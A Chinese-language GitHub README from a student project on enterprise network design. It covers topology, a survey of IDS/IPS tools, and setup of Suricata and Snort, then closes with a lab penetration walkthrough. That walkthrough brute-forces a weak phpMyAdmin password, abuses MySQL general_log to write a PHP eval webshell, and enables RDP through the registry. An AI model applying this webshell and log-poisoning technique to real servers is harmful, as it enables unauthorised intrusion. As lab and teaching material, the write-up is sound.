# Enterprise-Network-Architecture-and-Attack-and-Defense

# 一、云网络环境设计与搭建

## 拓扑结构

安全版本的拓扑结构如下：
![ace16bec-ec65-4f43-978a-340a14f841f4](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/6747f362-0d6d-46ad-82d0-ae60d052bee2)

## 不同区域的连接
OpenWrt+ZeroTier
![678d552d-62cc-43f1-8055-a3fcc2e114b5](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/d1ba4727-855e-4b5d-a7e6-ee920dfc664f)
a3fcc2e114b5.png)


![405ff339-9af9-4834-9d23-a688ba63951d](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/97bd7f62-b940-4ffe-ba9c-c1edb9e631b8)

<img width="684" alt="2beb477b-d95f-4e3b-b99e-11c4c2c5d72e" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/7f84134d-bab4-4644-8c2b-5ab6c33f5c9e">

网络拓扑补充
<img width="446" alt="50b6bd5b-4e22-4078-9424-4fd370bc29b5" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/d5bb5c58-9bfd-44b3-b2f8-7ecd8a701b46">



<img width="437" alt="88b3f838-db5d-4261-87d3-774c8e357a83" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/36a31848-b177-407a-aa4a-8fba35fcb716">

内部网络访问结果

<img width="494" alt="55ce52da-3301-415d-a08a-fae44287d977" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/0ff986ce-1290-4fe0-8871-f591895a464f">

外部网络访问结果

<img width="444" alt="69625372-b317-48d8-a724-c6b31c42569c" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/9996dc56-ce1b-4dae-a84e-4ecd90d5c0c9">



### 拓扑结构简介

#### 防火墙、IDS、IPS

在大型网络架构中，有交换机、路由器、防火墙、IDS、IPS、服务器等设备。

防火墙是防御系统，属于访问控制类产品，其较多应用在内网保护（NAT），流量监控，过滤等方面，而对攻击方面的检测盒防御相对较弱，所以需要IDS和IPS。

IDS是入侵检测系统，属于审计类产品，它采用类似“并联”的方式接入网络中，做一些攻击的检测工作，主要作用于应用层。它本身并不作防护，当它监测到攻击的时候，可能已经产生灾难了，所以IDS一般和IPS共同使用；

IPS是入侵防御系统，属于访问控制类产品，主要作用于应用层，不光对已知的攻击种类能防御，还能检测些异常协议的攻击，比较灵活，在网络中常常于防火墙“串联”接入网络。

大型企业网络架构有三层：接入层、汇聚层、核心层。

接入层接入不同的部门，不同部门属于不同的VLAN，保证不同部门之间的安全。


对内服务器有一个IDS入侵检测系统，检测对内服务器的安全。
对外服务器有一个WAF和IDS，用来检测外网用户对外服务器的访问。
边界防火墙主要是用来进行流量控制、流量过滤和进行内外网NAT转换。
在网络出口处，还有IPS入侵检测系统，实时检测是否有异常攻击行为，并及时阻断。


#### DMZ区

非军事化区，是一个对外服务区，存放着公共服务器，比如对外的服务器，对外的邮箱等，用户从外网访问到的服务都可以放在DMZ区。

##### 访问限制

内网可以访问外网

内网可以访问DMZ

外网不能访问内网

外网可以访问DMZ

DMZ访问内网有限制

DMZ一般不能访问外网

#### 办公区

内部人员正常办公的区域，防护水平不会太高，基本为杀毒软件或主机入侵检测产品。

攻击者进入办公区的手段通常为鱼叉攻击、水坑攻击和社会工程学攻击。

办公区按照系统可以分为OA系统、邮件系统、财务系统、文件共享系统、企业版杀毒系统、内部应用监控系统、运维管理系统

#### 核心区

存放最重要的数据、文档，安全设置最为严格。

按照系统可以分为业务系统、运维监控系统、安全系统。


## 公有云

### 方案对比

#### StarVCenter结合华为eNSP完成云平台构建

一套国产超融合(HCI)/服务器虚拟化/云平台IaaS软件，帮助企业自建私有云，提供云主机等基础设施服务。自称为“最好上手、最易落地的信创云”。

华为 eNSP ，又称华为企业网络仿真平台，是华为提供的一款免费的网络仿真工具平台，主要是对企业网的路由器、交换机、防火墙、无线设备进行软件仿真，可以在没有真实设备的情况下也能够进行网络实验测试，学习网络技术。

<img width="365" alt="1a59d473-6f7f-496f-ad8d-a62ddf106bd6" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/8044e85f-ddb0-4973-b909-7ecc1dc5a209">

由于这两个软件的集成化程度很高，这样的配备方案可以快速、简单地实现整个企业环境的搭建，但相应地也会带来问题，比如：StarVCenter没有良好的讨论社区，如果遇到问题很难找到解决方案；eNSP仿真平台可能与实际环境存在差异，影响后续攻防尝试的效果；整体企业环境配备过于一体化，没有办法在配备过程中，学习到企业环境配置的相关知识。

#### 通过openstack来搭建云环境

OpenStack是一个开源的云计算管理平台项目，是一系列软件开源项目的组合,为私有云和公有云提供可扩展的弹性的云计算服务。项目目标是提供实施简单、可大规模扩展、丰富、标准统一的云计算管理平台。

#### 配置过程

OpenStack云平台搭建需要两个节点，一个是controller（控制节点），另一个是compute（计算节点）。

控制节点（controller）规划如下：

        一块200G的硬盘。两块网卡，第一块网卡IP地址使用192.168.100.10，第二块网卡IP地址使用192.168.200.10。

计算节点（compute）规划如下：

        一块200G的硬盘和一块100G的硬盘。两块网卡，第一块网卡IP地址使用192.168.100.20，第二块网卡IP地址使用192.168.200.20。

**controller网卡配置如下：**

<img width="412" alt="f766b458-c7b5-4d27-9400-771bd18c39b3" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/ad0f03cd-116d-43cb-9a34-c4a3306b75f0">

**conpute网卡配置如下：**

<img width="411" alt="6f60eb9d-064b-423d-aeee-624aab0bfefc" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/e2f4528c-d2b8-47e2-bd35-d17fb19b7b91">

**配置步骤：**

1. 上传centos7.0镜像和chinaskills_cloud_iaas.iso镜像至controller节点。
2. 挂载镜像
3. yum源文件处理
4. 配置vsftpd
5. 修改openstack的配置脚本
6. 在Cotroller节点和Compute节点分别刷新脚本

**结果展示：**
<img width="196" alt="b3bd3032-7af4-4483-b296-dada6574c43c" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/7622e7b7-9f1b-45a7-b777-ef0c55b284f7">

<img width="444" alt="66e2217e-b742-4ac0-ad6a-48189e6db126" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/bb3a9a51-2562-4030-9d8b-1b593b205167">


#### OpenStack如何实现与其他主机的互联

（1）将其中一张网卡改为桥接模式，并添加MAC地址
- 修改要桥接网卡的配置信息，使之与物理机在同一网段
- 添加网关配置，与物理机保持一致
- 选择桥接模式网络

<img width="407" alt="70b33e92-0817-4dcc-a1eb-18ba060d7f5d" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/2ea3b734-91a9-4a9e-9bbd-38896e63a03d">

（2）将虚拟机的端口映射到主机的端口上


<img width="365" alt="f71a2959-ea72-4ec3-aaca-9f5cc525098f" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/8f0b763d-e5c2-405f-8253-c530beba027c">

例如：把虚拟机80端口映射到主机8090端口


https://71423st062.goho.co/dashboard/auth/login/

![482c0376-9e5f-4463-9999-e9d1108ef179](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/6ac12bcd-17e5-40ea-bfc4-87cee8a1fdfc)

admin登录openstack

![3e060c30-57d1-40ad-aa68-e0f7dd748817](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/4cda710e-bb43-4684-aa91-065b70903dd7)


user登录openstack
![d7d1894b-ff03-4f7d-b44e-a4fa831de183](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/26b7bb62-234a-4683-b5ab-783f9684ebda)

## IPS/IDS
### IDS/IPS调研
#### 1 Linux入侵检测系统
以下是可以在Unix/Linux平台上运行的主机入侵检测系统和网络入侵系统的列表。
**1.1 基于网络的入侵检测系统：**
Snort
Zeek
Suricata
Sagan
Security Onion（Linux）
Open WIPS-NG（Linux）
**1.2 基于主机的入侵检测系统：**
CrowdStrike Falcon
EventLog Analyzer
OSSEC
Sagan
Security Onion（Linux）
AIDE
Samhain
Fail2Ban
#### 2 基于网络的IDS(NIDS)
**2.1 Snort：**
Snort(NIDS)是一个免费的开源网络入侵检测和预防工具。它是由Martin Roesch于1998年创建的。使用Snort的主要优点是能够在网络上执行实时流量分析和数据包记录。凭借协议分析，内容搜索和各种预处理器的功能，Snort被广泛接受为检测各种蠕虫，攻击，端口扫描和其他恶意威胁的工具。它可以配置三种主要模式 - 嗅探器，数据包记录器和网络入侵检测。在嗅探器模式下，程序将只读取数据包并在控制台上显示信息。在数据包记录器模式下，数据包将被记录在磁盘上。在入侵检测模式下，程序将监控实时流量并将其与用户定义的规则进行比较。
Snort可以检测到诸如缓冲区溢出，隐形端口扫描，CGI攻击，SMB探测，操作系统指纹尝试等各种攻击。它受到许多硬件平台和操作系统的支持，如Linux，OpenBSD，FreeBSD，Solaris，HP-UX ，MacOS，Windows等。
**优点**：
免费下载，是开源的
易于编写入侵检测规则
在部署方面具有高度灵活性和动态性
良好的社区支持解决问题，正在快速发展
**缺点**：
没有规则操作的GUI界面
处理网络数据包有点慢
无法检测到分割多个TCP数据包的签名，这是在以串联模式配置数据包时发生的
**2.2 Security Onion：**
Security Onion是入侵检测，网络安全监控和日志管理的Linux发行版。开源发行版基于Ubuntu，包含许多IDS工具，如Snort，Suricata，Bro，Sguil，Squert，Snorby，ELSA，Xplico，NetworkMiner等等。Security Onion为网络流量，警报和可疑活动提供了高可见性和环境。但是这需要系统管理员进行适当的管理来检查警报，监视网络活动并定期更新基于IDS的检测规则。
核心功能：
完整的数据包捕获
基于网络和主机的入侵检测系统
强大的分析工具
完整的数据包捕获：这是通过使用netsnifff-ng完成的，捕获Security Onion可以看到的所有网络流量，并且可以像存储解决方案一样存储。它就像一个网络实时摄像机，提供了网络上发生的威胁和恶意活动的所有证据。
基于网络和基于主机的IDS：分析网络或主机系统，并为检测到的事件和活动提供日志和警报数据。Security Onion拥有多种IDS选项，如规则驱动的IDS，分析驱动的IDS，HIDS等。
分析工具：除了网络数据捕获外，Security Onion还包括Sguil，Squert，ELSA等各种工具，用于协助管理员进行分析。
Security Onion还为常规独立，服务器传感器和混合监控工具的实时部署提供了多种方式。
**优点**：
为用户提供一个高度灵活的环境，以根据需要调整网络安全
由预先安装的传感器管理工具，流量分析仪和数据包嗅探器组成，无需额外的IDS / IPS软件即可运行
定期更新以提高安全级别
**缺点**：
安装后不能作为IPS使用，而只能作为IDS使用，用户在网站上找不到任何关于此的说明
不支持用于管理网络的Wi-Fi
管理员需要学习各种工具来有效使用Security Onion发行版
配置文件除规则以外不能自动备份; 因此此活动需要使用第三方软件
**2.3 Suricata：**
Suricata(NIDS)是开源信息安全基金会（Open Information Security Foundation）开发的一个开源，快速，高度稳定的网络入侵检测系统。Suricata引擎能够实时入侵检测，内联入侵防御和网络安全监控。Suricata由几个模块组成，如捕捉，采集，解码，检测和输出。它捕获在解码之前在一个流中传递的流量，这是非常优化的。但是与Snort不同的是，它在捕获并指定流程将如何在处理器之间分离之后配置单独的流程。
**优点**：
在OSI模型的第七层进行网络流量处理，从而增强了检测恶意软件活动的能力
自动检测和分析IP，TCP，UDP，ICMP，HTTP，TLS，FTP，SMB和FTP等协议，以便适用于所有协议
高级功能包括多线程和GPU加速
**缺点**：
与Snort等其他IDS相比，支持较少
操作复杂，需要更多的系统资源才能完成功能
**2.4 Zeek：**
Zeek(NIDS)是由Vern Paxson开发的一种被动的，开源的网络流量分析器，用于收集网络测量数据，进行法庭调查，交通基础内衬等等。Zeek包含一组日志文件，用于记录网络活动，如HTTP会话，包括URI，密钥标头，MIME类型，服务器响应，DNS请求，SSL证书，SMTP会话等。此外，它提供了复杂的功能，用于分析和检测威胁，从HTTP会话中提取文件，复杂的恶意软件检测，软件漏洞，SSH蛮力攻击和验证SSL证书链。
Zeek分为两层:
Bro事件引擎：当网络上发生异常时，它执行使用C ++分析实时或记录的网络流量包的事件。
Bro策略脚本：这些策略分析事件以创建操作策略，使用策略脚本处理事件，例如发送电子邮件，发出警报，执行系统命令，甚至调用紧急号码。
**优点**：
Zeek非常灵活，使用脚本语言来允许用户为每个受保护的对象设置监视规则
在拥有大量流量的网络中高效工作，并处理大型网络项目
能够深入分析流量，并支持多种协议的分析仪。
**缺点**：
不容易处理，因为它有一个复杂的架构
需要编程经验才能胜任处理Zeek系统，不过它有详细的文档
#### 3 基于主机的IDS(HIDS)
**3.1 OSSEC：**
OSSEC(HIDS)是一个基于免费和开放源码的基于主机的IDS，可以执行日志分析，完整性检查，Windows注册表监视，rootkit检测，基于时间的警报和主动响应等各种任务。OSSEC系统配备了集中式和跨平台架构，可以让管理员准确地监控多个系统。
OSSEC系统包括以下三个主要组件:
主要应用：这是安装的主要要求; OSSEC由Linux，Windows，Solaris和Mac环境支持。
Windows代理程序：只有在基于Windows的计算机/客户端以及服务器上安装OSSEC时才需要。
Web界面：基于Web的GUI应用程序，用于定义规则和网络监视。
**优点**：
多平台IDS系统提供实时和可配置的警报
集中管理，代理和无代理监控
可以在无服务器和服务器代理模式下使用
**缺点**：
升级过程使用开箱即用的规则覆盖现有的规则
预共享密钥可能很麻烦
Windows操作系统仅在服务器代理模式下受支持
**3.2 Tripwire：**
开源的Tripwire是一个基于主机的入侵检测系统，专注于检测文件系统对象的变化。在第一次初始化时，Tripwire根据系统管理员的指示扫描文件系统，并将每个文件的信息存储在数据库中。当文件被更改并在将来扫描时，结果将与存储的值进行比较，并将更改报告给用户。
Tripwire利用加密哈希来检测文件的变化。除了扫描文件更改外，还用于完整性保证，更改管理和策略合规性。
**优点**：
非常适合小型，分散式Linux系统
与Linux良好的集成
**缺点**：
只能在Linux上运行
要求用户成为Linux专家
高级功能在开源版本中不可用
没有实时警报
**3.3 AIDE：**
AIDE（高级入侵检测环境—HIDS）由Rami Lehti和Pablo Virolainen开发。它被认为是监视UNIX或Linux系统变化的最强大工具之一。AIDE通过从配置文件中找到的正则表达式规则创建一个数据库。初始化数据库时，用于验证文件的完整性。
AIDE的一些最强大的功能如下：
支持各种消息摘要算法，如MD5，SHA1，RMD160，TIGER，SHA256和SHA512
支持POSIX ACL，SELinux，XAttra和扩展文件系统
强大的正则表达式支持，包含或排除要监视的文件和目录
支持各种操作系统平台，如Linux，Solaris，Mac OS X，UNIX，BSD，HP-UX等
**优点**：
实时检测和消除攻击者恢复文件或目录属性
异常检测以减少文件系统监视器的错误率
支持广泛的加密算法
**缺点**：
没有GUI界面
需要仔细配置以有效检测和预防
不能正确处理长文件名以便顺利检测
#### 4 选择NIDS还是HIDS
两者都要有。HIDS和NIDS这两个系统在很大程度上是互补的，许多机构的网络安全解决方案都同时采用了基于主机和基于网络的两种入侵检测系统。实际上，许多用户在使用IDS时都配置了基于网络的入侵检测，但不能保证检测并能防止所有的攻击，特别是一些加密包的攻击，而网络中的DNS、Email和Web服务器经常是攻击的目标，但是，它们又必须与外部网络交互，不可能对其进行全部屏蔽，所以，应当在各个服务器上安装基于主机的入侵检测系统。因此，即便是小规模的网络结构，也常常需要基于主机和基于网络的两种入侵检测能力。
#### 5 选择snort还是suricata
**5.1 Snort的主要优势：**
**可扩展性**：Snort可以在任何网络环境中部署。
**灵活性和可用性**：Snort可以在各种操作系统上运行，包括Linux，Windows和Mac OS X。
**实时性**：Snort可以提供实时网络流量事件信息。
**部署灵活**：Snort可以通过数千种方式进行部署，并且可以使用无数的数据库、日志记录系统和工具。
**快速检测和应对安全威胁**：Snort与防火墙和其他安全基础架构结合使用，可帮助组织检测和响应旨在消除网络和网络的系统破解程序、蠕虫、网络漏洞、安全威胁和策略滥用者计算机系统。
**模块化检测引擎**：Snort传感器是模块化的，可以从一个物理和逻辑位置监控多台机器。Snort可以放在防火墙前面、防火墙后面、防火墙旁边、以及其他任何地方，以监控整个网络。因此，使用Snort作为安全解决方案，可以确定是否有未经授权的企图入-侵网络，或者黑-客是否未经授权访问网络系统。
**5.2 Suricata的主要优势：**
**开源引擎**：社区的力量在IT安全防御中运行良好，因为社区在捕获新兴威胁的特征方面比单个组织更有效。
**多线程**：多线程架构允许引擎利用当今系统的多核和多处理器架构（Snort自3.0以后也支持多线程）。
**支持IP信誉**：通过在其引擎中加入声誉和签名，Suricata可以标记来自已知不良来源的流量。
**自动协议检测**：预处理器自动识别网络流中使用的协议，并应用适当的规则，而不管数字端口如何。自动协议检测还可以防止用户错误和错误，这些错误和错误实际上更常见。

### suricata（IPS）部署

#### 1.关闭两台虚拟机上的firewall防火墙

```Bash
#关闭防火墙
systemctl stop firewalld.service
#执行开机禁用防火墙自启命令 
systemctl disable firewalld.service
```

#### 2.配置Host网卡

首先为Host配置网卡

```Bash
vi /etc/sysconfig/network-scripts/ifcfg-ens33
```

![8061bb29-9f8e-427f-860e-6f72a79408db](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/4a651799-a55f-4e8c-874e-2fbb2df72f24)

重启网卡

```Bash
service network restart
```


#### 3.配置Gateway网卡

```Bash
vi /etc/sysconfig/network-scripts/ifcfg-ens36
```

![7c822d17-0ad2-4ff8-b276-8c99d27f5409](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/1bc4c752-407f-4f12-948e-bde67fede1d6)


```Bash
#重启网卡
service network restart
```

#### 4.Gateway配置IP转发

```Bash
vi /etc/sysctl.conf
#在最后一行添加这句
net.ipv4.ip_forward = 1

#查看是否配置成功
sysctl -p
```
![2b947abf-4056-4ca4-8d08-a61c616a201f](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/c128ccb4-68f0-4af6-8558-e474e91ee851)

这时虚拟机Host就可以ping通Gateway了，但仍然无法访问外网。

#### 5.在Gateway上配置iptable转发规则

```Bash
#清除所有规则来暂时停止防火墙
iptables -t nat -F
#配置转发规则
iptables -t nat -A POSTROUTING -s 30.1.1.0/24 -j MASQUERADE
```

这时Host虚拟机就可以访问外网了，但外网还不能访问Host的服务（Host已配置nginx服务用来测试）

```Bash
#配置转发规则
iptables -t nat -A PREROUTING -p tcp -i ens33 --dport 8080 -j DNAT --to 30.1.1.70:80
#开启8080端口
iptables -I INPUT -p tcp --dport 8080 -j ACCEPT
```

用宿主机访问192.168.10.249:8080，发现可以访问到nginx服务。

此时内网外网已经互通，需要配置suricata来限制内网->外网与外网->内网的访问。

如果上面方法行不通，还可以这样做（这次是访问192.168.43.140:80）

```text
#启动rinetd
rinetd -c /etc/rinetd.conf
#暂停rinetd
pkill rinetd
```

#### 6.在Gateway上安装suricata

可以参照官方文档安装suricata

[3. Installation — Suricata 7.0.0-rc2-dev documentation](https://suricata.readthedocs.io/en/latest/install.html)

```Bash
#在CentOS7上安装suricata
yum install epel-release yum-plugin-copr
yum copr enable @oisf/suricata-6.0
yum install suricata
#查看suricata版本
suricata -V
```

#### 7.修改配置

修改suricata作用的接口

```Bash
sed -i 's/eth0/ens33/g' /etc/suricata/suricata.yaml
sed -i 's/eth0/ens33/g' /etc/sysconfig/suricata
```

配置防火墙将流量转发至suricata

```Bash
iptables -I FORWARD -i ens36 -o ens33 -j NFQUEUE
iptables -I FORWARD -i ens33 -o ens36 -j NFQUEUE
iptables -vnL
```

#### 8.使用ET规则

由于自己编写规则准确率不够高，而且不能做到面面俱到，所以使用ET规则

首先启用suricata.rules规则，因为使用Suricata-update更新规则时，默认是将所有规则合并在一个规则文件中：/var/lib/suricata/rules/suricata.rules

```Bash
vi /etc/suricata/suricata.yaml
```

![40df7c8d-99e9-48d8-a47f-66d810c2211a](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/56f77f3f-76db-4c77-baf0-1b67df4ce4e2)


查看可用规则源

```Bash
suricata-update
suricata-update list-sources
```


启用ptresearch/attackdetection的规则集

```Bash
suricata-update enable-source ptresearch/attackdetection
```

再次更新我们的规则集

```Bash
suricata-update
```

列出我们使用的规则源

```Bash
suricata-update list-enabled-sources
```

运行suricata

```Bash
suricata -c /etc/suricata/suricata.yaml -q 0
```

查看日志，发现有规则库中设定的规则警告

```Bash
cat /var/log/suricata/fast.log
```

![d9ae1339-4d7f-49b7-a550-4496bafd5dd0](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/70ba76aa-e73d-48d1-b94c-5bb13299e34c)


### snort部署（IDS）

#### 1.预装daq所需程序

snort使用数据采集器(daq)监听防火墙数据包队列，所以按照daq。需预装的程序有：flex、bison、libcap。

sudo apt-get install flex  
sudo apt-get install bison  
sudo apt-get install libpcap-dev

#### 2.安装daq

wget https://www.snort.org/downloads/snort/daq-2.0.7.tar.gz

  ![](https://secure2.wostatic.cn/static/4TNgxFGJB7dpZHotM7ovzj/image.png?auth_key=1685283177-rNhbPtFMWinxnuBEhwjJoq-0-b60a0ad5c6caaf418c80e5acf6aa1419)

  tar xvfz daq-2.0.7.tar.gz

cd daq-2.0.7 ./configure && make && sudo make install

![](https://secure2.wostatic.cn/static/nP2yxremhxBGF1ehncaP6r/image.png?auth_key=1685283177-Mi3SReamRJsLHGDbHSqAq-0-bdf6bd3ddcf946af566c90bce959d318)

#### 3.安装snort所需程序

apt-get install libpcre3-dev
apt-get install libdumbnet-dev
apt-get install zlib1g-dev

#### 4.安装snort

wget https://www.snort.org/downloads/snort/snort-2.9.20.tar.gz 

  ![](https://secure2.wostatic.cn/static/5164AJaFwHKMCz9BVYh4zd/image.png?auth_key=1685283177-usdD7SkKMB2u77R8RMBUoq-0-bbee6e7e855b7e3335cec5ca1e6b981e)

  tar xvfz snort-2.9.20.tar.gz

cd snort-2.9.20 ./configure --enable-sourcefire && make && sudo make install

./configure --disable-open-appid

#### 5.运行 snort 会要求你安装响应包，安装即可

apt-get install snort

运行snort -V

此时snort已经可以运行

![](https://secure2.wostatic.cn/static/NvQMypVMkqUBcStMoLJzx/image.png?auth_key=1685283177-2zDYJw7Xiqr9FqudBBrBqo-0-f118686c9e97ad6a71b361fe8138866c)

## 堡垒机

### 分类

- 网关型堡垒机
  - 部署在外部网络和内部网络之间，作为进入内部网络的一个检查点，用于提供对内部网络特定资源的安全访问控制。
  - 随着网络进出口处流量越来越大，部署在网关位置的堡垒机逐渐成为了性能瓶颈
  - 逐渐被日趋成熟的防火墙、UTM、IPS、网闸等安全产品所取代
- 运维审计型堡垒机
    - 部署在内网中服务器和网络设备等核心资源的前面，对运维人员的操作权限进行控制和操作行为审计
    - 解决了运维人员权限难以控制混乱局面，又可对违规操作行为进行控制和审计
    - 由于运维操作本身不会产生大规模的流量，堡垒机不会成为性能的瓶颈

### 开源堡垒机工具

- JumpServer
    - 具有开源、无插件、分布式、多云支持、云端存储、多租户等优势；
    - 被很多大企业作为堡垒机使用：
      
<img width="420" alt="4bac8006-e6e3-4e61-b8e2-1e99cb4a5d02" src="https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/75e2acb5-b022-4be9-b390-d27027bf1c8c">

- Teleport
- Next Terminal



## 攻击渗透验证（梁超越）

### 一、环境搭建

### **（1）web应用服务器（win7）**

第一张网卡（内网）：

![4b12c292-0b6f-4047-987d-edf78a1a1a0f](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/5bf9e1db-8020-41b6-933c-254cdb965bd4)


第二张网卡（公网）：

![61f81dfa-d5c9-44ec-8a34-ae0026148fb1](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/7bdfca8d-7c01-4507-b02f-481eb698fc72)

启动phpstudy环境：


![a4d0002d-a5eb-4742-930f-c46745755676](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/0f4e13a5-9834-4309-929b-3c85e678e72e)


### **（2）内网办公区主机**

**配置网卡为VMnet3:**
![c103bcd8-6b21-451c-b300-c23fb31cfc4d](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/55861654-c70e-4dfa-b1c4-e083a901e185)

**IP地址为：192.168.52.141**

![95f0ec89-6d07-4904-9526-47bf049de755](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/8cf47456-0ed9-46c3-ad73-c2ebdbb0b2d8)


**可以ping通DMZ区的win7：**

![78c00fdd-2c70-4e5c-a624-fc0cadcd25ac](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/c9eaa652-82c9-4a5a-a4c8-34dbb8e082b2)


### 二、渗透攻击

### **（1）DMZ区web服务器（win7）：**



端口扫描：

masscan + nmap
先用masscan进行快速端口扫描，然后用nmap进行详细扫描，识别服务。

zenmap端口扫描命令：

```bash
nmap -T4 -A -v http://192.168.111.128/
```

-T4 加快执行速度
-A 操作系统及版本探测
-v 显示详细的输出

![c8ea6cad-c652-4e86-85ef-f2a4c3feb5d7](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/72c0dbc9-c8d4-4ef3-81c6-5f547d601ce8)


访问80端口，发现web页面：



![7d4d3d02-e7d1-4502-b9e5-9eb25ad2c325](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/a464eb53-120c-42aa-ab73-8050f6ee0e67)

**扫描网站目录：**

![8e2d46c4-0b92-4995-ab0f-412ba6ba99c7](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/39e8a089-0f7f-4f08-a35a-5f7819e98505)

**备份文件夹（beifen.rar）：**

![fc0e14cf-fc91-4481-bf76-fa52a7786688](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/774b34af-1fec-4dbc-a238-74eef0e1ce80)

**phpinfo页面：**

![e56ea589-e6be-46cb-94cd-a9c9afedf55f](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/339a9a58-b725-4c78-bf36-f31c57b94ecb)



**phpmyadmin页面：**

![56bda7ee-3de6-4bec-b9b5-a56872965ad1](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/eac386c0-b3cc-407d-9a69-77c7b4a6c151)


**爆破密码：**

![85d1fe27-f57a-4026-9de9-913f1b85b778](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/a34726b8-c62a-45fc-aea3-72eb7e70d844)


是一个弱口令root——root

![7b90de00-b113-4ec2-80c1-981a0166c06f](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/85022543-e1e3-49ed-aed0-3aec1f533cda)

![fd3ecda9-8aac-4baa-9a8e-3dda8a4ae04d](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/835bc7e9-313e-4aa1-9f18-a11c3d0ffa97)


**利用phpmyadmin进行getshell：**

general_log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。如果可以自定义日志文件，并向日志文件里面写入内容，那么就可以成功 getshell：



**查看当前配置：**

```sql
SHOW VARIABLES LIKE 'general%'
```



![14f42dd7-651b-4c14-abee-21d176f3b133](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/12c7ba01-ebcd-416a-8332-9e829cde82b2)

**开启general_log:**

```sql
set global general_log = "ON";
```

![f93f462c-a268-4579-ac9b-e6540a74c213](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/49f207e0-7b6b-4cb4-821e-fca5d4e96e42)


**更改日志文件位置:**


```sql
set global general_log_file='C:/phpStudy/WWW/1.php';
```

![6d05c1f6-b552-44f4-8dad-186beee7bf71](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/e7a3a1b8-8211-40b8-ace6-e621df3d398a)


**再次查询：**

![9f752d18-20b3-46ad-a1d7-aac856f3f504](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/35a1d163-91db-4045-bf2d-b7ba82787263)


**向日志内写入一句话木马：**

```sql
select '<?php eval($_POST[1]); ?>';
```

![d8024002-4eb4-4dbc-9bfc-22f1fe0963de](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/1a51eefd-be2a-48e2-a4ef-5cac1ff1b104)


phpstudy探针页面下方有回显：

![8ff9e3e9-df37-4ff6-a51a-1e53b33f5862](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/8a4275da-f115-42d3-802a-d5323df6e701)


**使用蚁剑连接：**

![c993b9de-b72e-4220-98ae-cc39c9b989e1](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/da039637-e14c-4062-af5b-8931707af707)


**查看用户和ip：**
![dc3c684c-2477-4a76-b66f-09fb024374ca](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/3dc6a9ee-196b-4503-ad4d-5b91933547a3)



![be63aac0-0a3d-4cd4-b8f2-29a61eae1404](https://github.com/Tealalal/Enterprise-Network-Architecture-and-Attack-and-Defense/assets/92720453/afc3ce73-03ae-42cb-9d81-37193a9873ef)


**开启3389端口，准备远程桌面登录：**

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

